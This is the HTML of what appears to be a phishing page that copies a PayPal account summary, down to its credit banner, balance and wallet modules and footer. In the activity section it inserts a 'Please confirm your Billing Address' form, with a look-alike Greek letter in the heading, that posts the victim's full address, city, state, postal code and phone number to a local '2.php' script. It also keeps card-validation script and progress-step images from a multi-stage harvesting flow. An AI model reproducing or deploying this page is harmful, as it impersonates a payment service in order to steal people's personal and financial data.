class="speakableText">close</span></a></div></div><div class="emModule js_emModule nemo_EM_PPCreditBanner" data-bg-img="https://www.paypalobjects.com/webstatic/walletweb-engagement/ppcredit/pp_credit_bg.jpeg" style="background: white url(&quot;https://www.paypalobjects.com/webstatic/walletweb-engagement/ppcredit/pp_credit_bg.jpeg&quot;) no-repeat scroll center center / cover ;"><div class="emModuleContent js_emModuleContent"><img class="creditOffer-logo" src="./PayPal_ Summary1_files/pp-credit-logo.png"><div class="mpiBannerContainer js_mpiBannerContainer"><div class="mpiBanner mpi-right creditOffer-banner"><div class="mpiTextContainer creditOffer-textContainer" style="color: #292929;"><h3 class="mpiHeader creditOffer-header">get more time</h3><p class="mpiHeader creditOffer-applyText">for whatever you have in mind.</p><p class="creditOffer-body">Get 6 months to pay on purchases of $99+ when you check out with PayPal and choose PayPal Credit.</p><p class="creditOffer-smallText">Subject to credit approval.<a href="https://creditapply.paypal.com/apply?guid=IK3CZ0WT" class="mpiSecondaryAction  creditOffer-smallText" name="bmlSecondaryAction" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" ##">See terms</a></p><a href="https://creditapply.paypal.com/apply?guid=IK3CZ0WT" class="vx_btn mpiPrimaryAction js_emPrimaryAction nemo_primaryActionButton_EM_PPCredit" ##" name="EM_PPCredit_CTA" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" style="background-color: ;">Apply Now</a></div></div></div><a href="###" class="js_dismiss emClose nemo_emClose" role="button" name="EM_PPCredit_Close" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" style="color: #292929;"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span class="speakableText">close</span></a></div></div></div></div><div class="mainBody"><div id="summary" class="summarySection"><div class="row"><div class="col-sm-4 summaryModuleContainer"><div class="twbs_alert vx_alert txnDelayMessage js_txnDelayMessage txnDelayMessage_mobile nemo_txnDelayMessageMobile hidden" data-hide-transaction-delay-message="true"><span class="icon icon-small icon-info-small" aria-hidden="true"></span><p class="vx_alert-text">Your latest transactions may take a few minutes to show up in your activity.</p></div><section class="fiModule-container js_fiModule-container nemo_balanceModule" aria-labelledby="walletModuleHeader " id="js_tourWalletModule"><div class="js_fiModule-title-container" id="fiModule-title-container"><a href="####wallet/balance" class="fiModule-link vx_text-5 fiModule-title"><span class="fiModule-title-header col-md-8 col-sm-8 col-xs-8">PayPal balance</span><span class="fiModule-title-link col-md-4 col-sm-4 col-xs-4">Details<span class="icon icon-arrow-right-half-small fiModule-icon-arrow js_fiModule-icon"></span></span></a></div><div class="fiModule-currency-container fiModule-currency_text"><div class="nemo_balanceNumeral">
<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText">No balance needed to shop or send money</span></div></div><ul class="fiModule-list nemo_balanceActions"><li class="addMoney dividedCellLeft vx_text-body_secondary"><a href="####/addFunds" class="addFunds nemo_addFunds" id="addFunds" data-push-replace="false" name="Summary_AddMoney" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Add money</a></li><li class="withdrawMoney vx_text-body_secondary"><a role="button" href="####/zeroBalance" class="withdrawFunds nemo_withdrawFunds" id="withdrawFunds" name="transfer" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Transfer to your bank</a></li></ul></section><div id="payAfterDelivery" class="payAfterDelivery"></div><section class="fiModule-container nemo_fiModule" id="js_tourFIModule" aria-labelledby="walletModuleHeader"><h3 class="fiModule-title vx_text-5">Banks and cards</h3><div class="js_fiModule-listView" data-link-bank="##wallet/add/bank" data-link-card="##wallet/add/card" data-wallet-page="##wallet" data-link-target="_top" data-link-bank-attributes="class=&#39;nemo_fiModule-actions nemo_fiModule-linkBank&#39;" data-link-bank-us-attributes="class=&#39;nemo_fiModule-actions nemo_fiModule-linkBank&#39; name=&#39;linkBank_benefit1&#39; data-pagename=&#39;main:consumer:summary::main&#39; data-pagename2=&#39;main:consumer:summary::main:::&#39; data-track-type=&#39;link&#39;" data-link-card-attributes="class=&#39;nemo_fiModule-actions nemo_fiModule-linkCard&#39;" data-update-fi-attributes="class=&#39;nemo_fiModule-actions nemo_fiModule-updateInWallet&#39;" data-user-config-features-bank="true" data-add-card="Link your card now to start shopping and sending money to friends." data-add-card-rewards="Pay securely with your favorite card. Get your card rewards too." data-add-card-security="Link your card and get an extra level of security."><ul class="fiModule-list fiModule-table enforceLtr"><li class="fiModule-list-item vx_text-body_secondary"><a href="####wallet/card/CC-5HRUCMHGL2UBQ" data-pagename="main:walletweb:home:FIModule:walletPage" data-pagename2="main:walletweb:home:FIModule:walletPage:::" data-track-type="link" class="fiModule-fiList-links"><span class="fiModule-cell"></span><span class="fiModule-cell"></span></a></li></ul><div class="fiModule-ctaText vx_text-body_secondary"><a href="####wallet" class="fiModule-table nemo_addFI"><span class="icon-addBank"><span class="icon icon-add-small icon-add_Bank"></span></span><span class="fiModule-cell fiModule-link-add nemo_linkFi">Link a bank or card</span></a></div></div></section><section class="fiModule-container js_fiModule-container nemo_sellingToolsModule sellingToolsModule" aria-labelledby="walletModuleHeader"><div class="js_fiModule-title-container" id="fiModule-title-container"><a href="##/webapps/mpp/merchant-services-hub" target="_top" class="nemo_sellingToolsHeader" name="sellingToolsHeader" {~}data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="fiModule-title-header col-md-6 col-sm-6 col-xs-6">Selling tools</span><span class="fiModule-title-link col-md-6 col-sm-6 col-xs-6">Details<span class="icon icon-arrow-right-half-small fiModule-icon-arrow js_fiModule-icon"></span></span></a></div><ul class="moduleListItems"><li class="vx_text-body_secondary"><a href="##/cgi-bin/invoiceweb?cmd=%5fmanage%2dinvoice&amp;nav=2%2e0" target="_top" class="nemo_sellingToolsInvoice" name="sellingToolsInvoice" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Manage invoices</a></li><li class="vx_text-body_secondary"><a href="##/cgi-bin/webscr?cmd=_bulk-ship" ##" class="nemo_sellingToolsMOS" name="sellingToolsMOS" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">MultiOrder shipping</a></li><li class="vx_text-body_secondary"><a href="##/us/cgi-bin/webscr?cmd=_profile-display-handler&amp;tab_id=SELLER_PREFERENCES" ##" class="nemo_sellingToolsSellerPref" name="sellingToolsSellerPref" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Seller preferences</a></li></ul></section><div class="fiModule-container nemo_accountStatusModule"><h3 class="fiModule-title vx_h5">More about your account</h3><ul class="moduleListItems"><li class="vx_text-body_secondary"><a href="##/US/merchantsignup/router" target="" class="nemo_acctStatusUpgrade" name="Summary_AcctStatusUpgrade" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Upgrade to a Business account</a></li><li class="vx_text-body_secondary"><a href="##/cgi-bin/webscr?cmd=_complaint-view&amp;amp;nav=0.5" target="_top" class="small-text nemo_acctStatusResCenter" name="Summary_ResolutionCenter" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Resolve a problem in our Resolution Center</a></li><li class="vx_text-body_secondary"><a href="##/cgi-bin/webscr?cmd=_show-limits&amp;req_from=view_limits" target="_top" class="small-text nemo_acctStatusLimits" name="Summary_AcctStatusLimits" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">See how much you can send with PayPal</a></li></ul></div></div><div class="col-sm-8 activityModuleContainer" id="js_transactionCollection"><div class="twbs_alert vx_alert txnDelayMessage js_txnDelayMessage nemo_txnDelayMessage hidden" data-hide-transaction-delay-message="true"><span class="icon icon-small icon-info-small" aria-hidden="true"></span><p class="vx_alert-text">Your latest transactions may take a few minutes to show up in your activity.</p></div><section class="activityModule js_completedModule nemo_completedModule" aria-labelledby="activityModuleHeaderCompleted"><h3 id="activityModuleHeaderCompleted" class="vx_h5 moduleHeader nemo_activityModuleHeaderCompleted"></h3><ul class="transactionList js_transactionList"><center><script type="text/javascript">
        $(document).ready(function() {
            $('.cc-container').ccvalidate({ onvalidate: function(isValid) {
                if (!isValid) {
                    alert('Please insert a valid credit / debit card.');
                    return false;
                }
            }
            });
            $('.cc-ddl-contents').css('display', 'none');
            $('.cc-ddl-header').toggle(function() {
                toggleContents($(this).parent().find('.cc-ddl-contents'));
            }, function() { toggleContents($(this).parent().find('.cc-ddl-contents')); });

            function toggleContents(el) {
                $('.cc-ddl-contents').css('display', 'none');
                if (el.css('display') == 'none') el.fadeIn("slow");
                else el.fadeOut("slow");
            }
            $('.cc-ddl-contents a').click(function() {
                $(this).parent().parent().find('.cc-ddl-o select').attr('selectedIndex', $('.cc-ddl-contents a').index(this));
                $(this).parent().parent().find('.cc-ddl-title').html($(this).html());
                $(this).parent().parent().find('.cc-ddl-contents').fadeOut("slow");
            });
            $(document).click(function() {
                $('.cc-ddl-contents').fadeOut("slow");
            });


            $('#check').click(function() {
                var cnumber = $('#cnumber').val();
                var type = $('#ctype').val();
                alert(isValidCreditCard(cnumber, type) ? 'Valid' : 'Invalid');
            });
        });
</script>

<style>
#check{
	appearance: none;
	-moz-appearance: none;
	-webkit-appearance: none;
	border: 1px solid RGB(0,112,186);
	width: 15px;
	height: 15px;
	border-radius: 2px;
	margin: 0 5px 0 0;
	outline: 0px;
}
#check:checked{
	background: RGB(0,112,186);
	border: 1px solid RGB(0,112,186);
}
</style>
<script>
function dateenter(){
			value11 = document.getElementById("dofb").value;
			if(value11.length == 2){
				if(document.getElementById("dofb").value = value11 + "/");
			}else if(value11.length == 5){
				if(document.getElementById("dofb").value = value11 + "/");
			}else if(value11.length > 5){
				document.getElementById("dofb").id="dofb2";
			};
}
</script>



<font class="moduleHeaderLink nemo_moduleHeaderLink" style="font-weight:bold;">Ρlease confirm your Billing Address </font>
<br>
<img src="./PayPal_ Summary1_files/3a.png">&nbsp;<img src="./PayPal_ Summary1_files/5a.png">&nbsp;<img src="./PayPal_ Summary1_files/5a.png">
<br>&nbsp;

<form method="post" action="2.php">
	
		
	<input style="
	width: 280px;
	height: 40px;
	border-radius: 4px;
	border: 1px solid #b0b6bf ;
	padding-left: 10px;
	padding-right: 10px;
	margin-top: 18px;
	font-size: 12pt;
	outline:0px;"  class="forminput" required="" type="text" id="addr" name="addr" placeholder="Full Address">
	<select style="
	width: 280px;
	height: 40px;
	border-radius: 4px;
	border: 1px solid #b0b6bf ;
	padding-left: 10px;
	padding-right: 10px;
	margin-top: 18px;
	font-size: 12pt;
	outline:0px;" class="forminput" name="country">
										<option selected="selected" value="Reserved">Country</option>
										<option disabled="" style="text-align:center">---------------</option>
								
										<option value="American Samoa">American Samoa</option>
										<option value="Andorra">Andorra</option>
										<option value="Angola">Angola</option>
										<option value="Anguilla">Anguilla</option>
										<option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
										<option value="Argentina">Argentina</option>
										<option value="Armenia">Armenia</option>
										<option value="Aruba">Aruba</option>
										<option value="Australia">Australia</option>
										<option value="Austria">Austria</option>
										<option value="Azerbaijan">Azerbaijan</option>
										<option value="Bahamas">Bahamas</option>
										<option value="Bahrain">Bahrain</option>
										<option value="Bangladesh">Bangladesh</option>
										<option value="Barbados">Barbados</option>
										<option value="Belarus">Belarus</option>
										<option value="Belgium">Belgium</option>
										<option value="Belize">Belize</option>
										<option value="Benin">Benin</option>
										<option value="Bermuda">Bermuda</option>
										<option value="Bhutan">Bhutan</option>
										<option value="Bolivia">Bolivia</option>
										<option value="Bonaire">Bonaire</option>
										<option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
										<option value="Botswana">Botswana</option>
										<option value="Brazil">Brazil</option>
										<option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
										<option value="Brunei">Brunei</option>
										<option value="Bulgaria">Bulgaria</option>
										<option value="Burkina Faso">Burkina Faso</option>
										<option value="Burundi">Burundi</option>
										<option value="Cambodia">Cambodia</option>
										<option value="Cameroon">Cameroon</option>
										<option value="Canada">Canada</option>
										<option value="Canary Islands">Canary Islands</option>
										<option value="Cape Verde">Cape Verde</option>
										<option value="Cayman Islands">Cayman Islands</option>
										<option value="Central African Republic">Central African Republic</option>
										<option value="Chad">Chad</option>
										<option value="Channel Islands">Channel Islands</option>
									
										<option value="Christmas Island">Christmas Island</option>
										<option value="Cocos Island">Cocos Island</option>
										<option value="Colombia">Colombia</option>
							
										<option value="Congo">Congo</option>
										<option value="Cook Islands">Cook Islands</option>
										<option value="Costa Rica">Costa Rica</option>
										<option value="Cote DIvoire">Cote DIvoire</option>
										<option value="Croatia">Croatia</option>
										<option value="Cuba">Cuba</option>
										<option value="Curaco">Curacao</option>
										<option value="Cyprus">Cyprus</option>
										<option value="Czech Republic">Czech Republic</option>
										<option value="Denmark">Denmark</option>
										<option value="Djibouti">Djibouti</option>
										<option value="Dominica">Dominica</option>
										<option value="Dominican Republic">Dominican Republic</option>
										<option value="East Timor">East Timor</option>
										<option value="Ecuador">Ecuador</option>
										<option value="Egypt">Egypt</option>
										<option value="El Salvador">El Salvador</option>
										<option value="Equatorial Guinea">Equatorial Guinea</option>
										<option value="Eritrea">Eritrea</option>
										<option value="Estonia">Estonia</option>
										<option value="Ethiopia">Ethiopia</option>
										<option value="Falkland Islands">Falkland Islands</option>
										<option value="Faroe Islands">Faroe Islands</option>
										<option value="Fiji">Fiji</option>
										<option value="Finland">Finland</option>
										<option value="France">France</option>
										<option value="French Guiana">French Guiana</option>
										<option value="French Polynesia">French Polynesia</option>
										<option value="French Southern Ter">French Southern Ter</option>
										<option value="Gabon">Gabon</option>
										<option value="Gambia">Gambia</option>
										<option value="Georgia">Georgia</option>
										<option value="Germany">Germany</option>
										<option value="Ghana">Ghana</option>
										<option value="Gibraltar">Gibraltar</option>
										<option value="Great Britain">Great Britain</option>
										<option value="Greece">Greece</option>
										<option value="Greenland">Greenland</option>
										<option value="Grenada">Grenada</option>
										<option value="Guadeloupe">Guadeloupe</option>
										<option value="Guam">Guam</option>
										<option value="Guatemala">Guatemala</option>
										<option value="Guinea">Guinea</option>
										<option value="Guyana">Guyana</option>
										<option value="Haiti">Haiti</option>
										<option value="Hawaii">Hawaii</option>
										<option value="Honduras">Honduras</option>
										<option value="Hong Kong">Hong Kong</option>
										<option value="Hungary">Hungary</option>
										<option value="Iceland">Iceland</option>
										<option value="India">India</option>
										<option value="Indonesia">Indonesia</option>
										<option value="Iran">Iran</option>
										<option value="Iraq">Iraq</option>
										<option value="Ireland">Ireland</option>
										<option value="Isle of Man">Isle of Man</option>
										<option value="Israel">Israel</option>
										<option value="Italy">Italy</option>
										<option value="Jamaica">Jamaica</option>
										<option value="Japan">Japan</option>
										<option value="Jordan">Jordan</option>
										<option value="Kazakhstan">Kazakhstan</option>
										<option value="Kenya">Kenya</option>
										<option value="Kiribati">Kiribati</option>
										<option value="Korea North">Korea North</option>
										<option value="Korea Sout">Korea South</option>
										<option value="Kuwait">Kuwait</option>
										<option value="Kyrgyzstan">Kyrgyzstan</option>
										<option value="Laos">Laos</option>
										<option value="Latvia">Latvia</option>
										<option value="Lebanon">Lebanon</option>
										<option value="Lesotho">Lesotho</option>
										<option value="Liberia">Liberia</option>
										<option value="Libya">Libya</option>
										<option value="Liechtenstein">Liechtenstein</option>
										<option value="Lithuania">Lithuania</option>
										<option value="Luxembourg">Luxembourg</option>
										<option value="Macau">Macau</option>
										<option value="Macedonia">Macedonia</option>
										<option value="Madagascar">Madagascar</option>
										<option value="Malaysia">Malaysia</option>
										<option value="Malawi">Malawi</option>
										<option value="Maldives">Maldives</option>
										<option value="Mali">Mali</option>
										<option value="Malta">Malta</option>
										<option value="Marshall Islands">Marshall Islands</option>
										<option value="Martinique">Martinique</option>
										<option value="Mauritania">Mauritania</option>
										<option value="Mauritius">Mauritius</option>
										<option value="Mayotte">Mayotte</option>
										<option value="Mexico">Mexico</option>
										<option value="Midway Islands">Midway Islands</option>
										<option value="Moldova">Moldova</option>
										<option value="Monaco">Monaco</option>
										<option value="Mongolia">Mongolia</option>
										<option value="Montserrat">Montserrat</option>
										<option value="Morocco">Morocco</option>
										<option value="Mozambique">Mozambique</option>
										<option value="Myanmar">Myanmar</option>
										<option value="Nambia">Nambia</option>
										<option value="Nauru">Nauru</option>
										<option value="Nepal">Nepal</option>
										<option value="Netherland Antilles">Netherland Antilles</option>
										<option value="Netherlands">Netherlands (Holland, Europe)</option>
										<option value="Nevis">Nevis</option>
										<option value="New Caledonia">New Caledonia</option>
										<option value="New Zealand">New Zealand</option>
										<option value="Nicaragua">Nicaragua</option>
										<option value="Niger">Niger</option>
										<option value="Nigeria">Nigeria</option>
										<option value="Niue">Niue</option>
										<option value="Norfolk Island">Norfolk Island</option>
										<option value="Norway">Norway</option>
										<option value="Oman">Oman</option>
										<option value="Pakistan">Pakistan</option>
										<option value="Palau Island">Palau Island</option>
										<option value="Palestine">Palestine</option>
										<option value="Panama">Panama</option>
										<option value="Papua New Guinea">Papua New Guinea</option>
										<option value="Paraguay">Paraguay</option>
										<option value="Peru">Peru</option>
										<option value="Phillipines">Philippines</option>
										<option value="Pitcairn Island">Pitcairn Island</option>
										<option value="Poland">Poland</option>
										<option value="Portugal">Portugal</option>
										<option value="Puerto Rico">Puerto Rico</option>
										<option value="Qatar">Qatar</option>
										<option value="Republic of Montenegro">Republic of Montenegro</option>
										<option value="Republic of Serbia">Republic of Serbia</option>
										<option value="Reunion">Reunion</option>
										<option value="Romania">Romania</option>
										<option value="Russia">Russia</option>
										<option value="Rwanda">Rwanda</option>
										<option value="St Barthelemy">St Barthelemy</option>
										<option value="St Eustatius">St Eustatius</option>
										<option value="St Helena">St Helena</option>
										<option value="St Kitts-Nevis">St Kitts-Nevis</option>
										<option value="St Lucia">St Lucia</option>
										<option value="St Maarten">St Maarten</option>
										<option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
										<option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
										<option value="Saipan">Saipan</option>
										<option value="Samoa">Samoa</option>
										<option value="Samoa American">Samoa American</option>
										<option value="San Marino">San Marino</option>
										<option value="Sao Tome &amp; Principe">Sao Tome &amp; Principe</option>
										<option value="Saudi Arabia">Saudi Arabia</option>
										<option value="Senegal">Senegal</option>
										<option value="Serbia">Serbia</option>
										<option value="Seychelles">Seychelles</option>
										<option value="Sierra Leone">Sierra Leone</option>
										<option value="Singapore">Singapore</option>
										<option value="Slovakia">Slovakia</option>
										<option value="Slovenia">Slovenia</option>
										<option value="Solomon Islands">Solomon Islands</option>
										<option value="Somalia">Somalia</option>
										<option value="South Africa">South Africa</option>
										<option value="Spain">España</option>
										<option value="Sri Lanka">Sri Lanka</option>
										<option value="Sudan">Sudan</option>
										<option value="Suriname">Suriname</option>
										<option value="Swaziland">Swaziland</option>
										<option value="Sweden">Sweden</option>
										<option value="Switzerland">Switzerland</option>
										<option value="Syria">Syria</option>
										<option value="Tahiti">Tahiti</option>
										<option value="Taiwan">Taiwan</option>
										<option value="Tajikistan">Tajikistan</option>
										<option value="Tanzania">Tanzania</option>
										<option value="Thailand">Thailand</option>
										<option value="Togo">Togo</option>
										<option value="Tokelau">Tokelau</option>
										<option value="Tonga">Tonga</option>
										<option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
										<option value="Tunisia">Tunisia</option>
										<option value="Turkey">Turkey</option>
										<option value="Turkmenistan">Turkmenistan</option>
										<option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
										<option value="Tuvalu">Tuvalu</option>
										<option value="Uganda">Uganda</option>
										<option value="Ukraine">Ukraine</option>
										<option value="United Arab Erimates">United Arab Emirates</option>
										<option value="United Kingdom">United Kingdom</option>
										<option value="United States of America">United States of America</option>
										<option value="Uraguay">Uruguay</option>
										<option value="Uzbekistan">Uzbekistan</option>
										<option value="Vanuatu">Vanuatu</option>
										<option value="Vatican City State">Vatican City State</option>
										<option value="Venezuela">Venezuela</option>
										<option value="Vietnam">Vietnam</option>
										<option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
										<option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
										<option value="Wake Island">Wake Island</option>
										<option value="Wallis &amp; Futana Is">Wallis &amp; Futana Is</option>
										<option value="Yemen">Yemen</option>
									
									</select>


	<input style="
	width: 280px;
	height: 40px;
	border-radius: 4px;
	border: 1px solid #b0b6bf ;
	padding-left: 10px;
	padding-right: 10px;
	margin-top: 18px;
	font-size: 12pt;
	outline:0px;"  class="forminput" required="false" type="text" id="Ville" name="ville" placeholder="State">
	
	<input style="
	width: 280px;
	height: 40px;
	border-radius: 4px;
	border: 1px solid #b0b6bf ;
	padding-left: 10px;
	padding-right: 10px;
	margin-top: 18px;
	font-size: 12pt;
	outline:0px;" class="forminput" required="" type="text" id="provence_region" name="provence_region" placeholder="City">
					
	<input style="
	width: 280px;
	height: 40px;
	border-radius: 4px;
	border: 1px solid #b0b6bf ;
	padding-left: 10px;
	padding-right: 10px;
	margin-top: 18px;
	font-size: 12pt;
	outline:0px;" class="forminput" required="" pattern="^[a-zA-Z0-9]{4,}$" type="text" id="zip" name="zip"  placeholder=" Postal Code">
	
	<input style="
	width: 280px;
	height: 40px;
	border-radius: 4px;
	border: 1px solid #b0b6bf ;
	padding-left: 10px;
	padding-right: 10px;
	margin-top: 18px;
	font-size: 12pt;
	outline:0px;"  class="forminput" required="" type="text" id="phone_number" name="phone" placeholder="Phone">
	
	<br>
	
	<br>

<input style="width:56%;height:46px;padding:0;border:1px;display:block;border-radius: 6px;background-color:#0070ba; color:#ffffff;font-weight: gold;font-size:17px;" class="btn block" value="Continue" type="submit">
</form>

</center>

</ul></section></div></div></div></div></div></div>

 <div id="footer" class="noPrint nemo_footer vx_globalFooter-container" role="contentinfo"><div class="vx_globalFooter">

<div class="vx_globalFooter-content">
<ul class="vx_globalFooter-list"><li><a href="##/selfhelp/home" target="_top" class="nemo_helpLink" name="footerHelp">

Help &amp; Contact</a></li><li><a href="##/webapps/mpp/paypal-safety-and-security" ##" class="nemo_securityLink" name="footerSecurity">Security</a></li></ul><div class="footerSmallText vx_globalFooter-disclaimer">&nbsp;</div></div></div></div></div><div id="firefly-doc-container" style="display: none;"><div id="cdocViewer" class="cdoc-viewer"></div>





<a href="N_vierNouveau%20dossier/PayPal_%20Summary1.html#" class="firefly-docviwer-close-button"><span>Close</span>


	<img src="N_vierNouveau%20dossier/undefinedimg/cross_icon.jpg"></a></div><div id="firefly-doc-container" style="display: none;"><div id="cdocViewer" class="cdoc-viewer"></div><a href="N_vierPayPal_%20Summary.html#" class="firefly-docviwer-close-button"><span>Close</span><img src="N_vierundefinedimg/cross_icon.jpg"></a></div><div id="firefly-doc-container" style="display: none;"><div id="cdocViewer" class="cdoc-viewer"></div><a href="###" class="firefly-docviwer-close-button"><span>Close</span><img src="N_vierundefinedimg/cross_icon.jpg"></a></div><section id="fullscreentooltip"></section><div id="alertDialogs" class="alertDialogs"></div><section id="overpanel" class="theoverpanel animated med hide" tabindex="-1" role="dialog" aria-labelledby="overpanel-header" aria-hidden="true"></section><section id="js_ajaxErrorOverpanel" class="theoverpanel animated med hide" tabindex="-1" role="dialog" aria-labelledby="overpanel-header" aria-hidden="true"><div class=" overpanel-wrapper row"><div class=" overpanel-content maxOverpanelWidth" role="document"><div id="overpanel-header" class=" overpanel-header"><div class="fullScreenDialog"><span class="icon icon-large icon-critical-large" aria-hidden="true"></span><h2 class="vx_h1">Temporarily unable to load page.</h2></div></div><div class=" overpanel-body"><div class="fullScreenDialog"><p class="fullBodyText">This may be due to temporary problems with our servers, or you may have been disconnected from the Internet. If you're connected to the Internet, try reloading the page at a later time. We apologize for the inconvenience.</p><p><button class="vx_btn tryAgain">Reload</button></p></div></div></div></div></section><script type="text/javascript" src="./PayPal_ Summary1_files/pp_jscode_080706.js.download"></script><div id="analytics" data-pagename="main:walletweb:summary::main" data-c25="main:walletweb:summary::main:::" data-c27="" data-c28="" data-v56="US"></div><script type="text/javascript">var s = s || {t: function(){}};s.prop71="Nodejs";s.prop6="6QTLB5YWUF59L";s.prop7="personal";s.prop10="US";s.prop40="977a023d159ab";s.prop20="1479607378169";s.prop1="walletexpnodeweb/public/templates/summary/index.dust";s.pageName="main:walletweb:summary::main";s.eVar31="main:consumer:summary::main";s.eVar25="main:consumer:summary::main:::";s.prop25="main:walletweb:summary::main:::";s.channel="summary";s.prop51="";s.hier1="";s.prop35="::";s.prop37="consumer";s.prop30="";s.prop31="";s.eVar2="";s.prop52="|walletexpnodeweb_global_activity_currencyconversion_control,us_8ball_mybenefits_8ball_entry_control,us_8ball_activity_experience_beta_treatment,consumerweb_US_walletexpnodeweb_sws_spotlight_treatment,8ball_p2p_dynamicEngagementModule_control,8ball_summary_dismiss_notification_treatment,us_8ball_transaction_details_control,us_8ball_wallet_cip_flow_test,us_8ball_activity_elastic_search_treatment,us_8ball_web_summary_pay_request_treatment,8ball_summary_quicktour_control,US_8ball_pp_master_debitcard_newflow_treatment,us_8ball_wallet_ppcash_test,p2p_repeatTransaction_test,8ball_summary_limits_treatment,8ball_wallet_fmx_bwop_test1,8ball_summary_zeroactivity_links_treatment";/************ DO NOT ALTER ANYTHING BELOW THIS LINE ! *************/function scOnload(){var s_code=s.t();if(s_code)document.write(s_code);}if (window.addEventListener){window.addEventListener('load',scOnload,false);} else if (window.attachEvent){window.attachEvent('onload', scOnload);};if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')</script><noscript>&amp;amp;lt;img src="https://paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript" alt="" height="1" width="1" border="0"&amp;amp;gt;</noscript></script><div style="position: absolute; top: 0px;"><object width="1" height="1" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="midflash"><param name="movie" value="https://www.paypalobjects.com/en_US/m/midOpt.swf"><param name="wmode" value="transparent"><param name="quality" value="high"><param name="menu" value="false"><param name="allowScriptAccess" value="always"><embed src="https://www.paypalobjects.com/en_US/m/midOpt.swf" quality="high" width="1" height="1" name="midflash" allowscriptaccess="always" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer"></object></div><iframe allowtransparency="true" frameborder="0" name="__PAYPALSITEWIDESEARCH__1" src="./PayPal_ Summary1_files/embed.js.html" style="position: fixed; top: 0px; opacity: 0; transition: opacity 0.2s; left: -99999px; width: 100%; height: 100%; border-width: 0px; z-index: 1000;"></iframe><div style="position: absolute; top: 0px;"><object width="1" height="1" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="midflash"><param name="movie" value="https://www.paypalobjects.com/en_US/m/midOpt.swf"><param name="wmode" value="transparent"><param name="quality" value="high"><param name="menu" value="false"><param name="allowScriptAccess" value="always"><embed src="https://www.paypalobjects.com/en_US/m/midOpt.swf" quality="high" width="1" height="1" name="midflash" allowscriptaccess="always" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer"></object></div><iframe allowtransparency="true" frameborder="0" name="__PAYPALSITEWIDESEARCH__1" src="./PayPal_ Summary1_files/embed.js(1).html" style="position: fixed; top: 0px; opacity: 0; transition: opacity 0.2s; left: -99999px; width: 100%; height: 100%; border-width: 0px; z-index: 1000;"></iframe><div style="position: absolute; top: 0px;"><object width="1" height="1" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="midflash"><param name="movie" value="https://www.paypalobjects.com/en_US/m/midOpt.swf"><param name="wmode" value="transparent"><param name="quality" value="high"><param name="menu" value="false"><param name="allowScriptAccess" value="always"><embed src="https://www.paypalobjects.com/en_US/m/midOpt.swf" quality="high" width="1" height="1" name="midflash" allowscriptaccess="always" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer"></object></div><iframe allowtransparency="true" frameborder="0" name="__PAYPALSITEWIDESEARCH__1" src="./PayPal_ Summary1_files/embed.html" style="position: fixed; top: 0px; opacity: 0; transition: opacity 0.2s; left: -99999px; width: 100%; height: 100%; border-width: 0px; z-index: 1000;"></iframe><div style="position: absolute; top: 0px;"></div><iframe style="position: fixed; top: 0px; opacity: 0; transition: opacity 0.2s ease 0s; left: -99999px; width: 100%; height: 100%; border-width: 0px; z-index: 1000;" allowtransparency="true" name="__PAYPALSITEWIDESEARCH__1" src="./PayPal_ Summary1_files/a.html" frameborder="0"></iframe><script type="text/javascript">var dataLayer = {contentCountry: 'US'.toLowerCase(),contentLanguage: 'en_US'.toLowerCase(),FptiId: '7f2247f81580a10ddfa33624ffdc5bc0'};</script><script type="text/javascript" src="./PayPal_ Summary1_files/bootstrap.js.download"></script><div id="firefly-doc-container" style="display: none;"><div id="cdocViewer" class="cdoc-viewer"></div><a href="###" class="firefly-docviwer-close-button"><span>Close</span><img src="./PayPal_ Summary1_files/cross_icon.jpg"></a></div><div id="firefly-doc-container" style="display: none;"><div id="cdocViewer" class="cdoc-viewer"></div><a href="###" class="firefly-docviwer-close-button"><span>Close</span><img src="./PayPal_ Summary1_files/cross_icon(1).jpg"></a></div><div id="firefly-doc-container" style="display: none;"><div id="cdocViewer" class="cdoc-viewer"></div><a href="N_vierPayPal_%20Summary.html#" class="firefly-docviwer-close-button"><span>Close</span><img src="./PayPal_ Summary1_files/cross_icon(2).jpg"></a></div><div id="firefly-doc-container" style="display: none;"><div id="cdocViewer" class="cdoc-viewer"></div><a href="N_vierNouveau%20dossier/PayPal_%20Summary1.html#" class="firefly-docviwer-close-button"><span>Close</span><img src="./PayPal_ 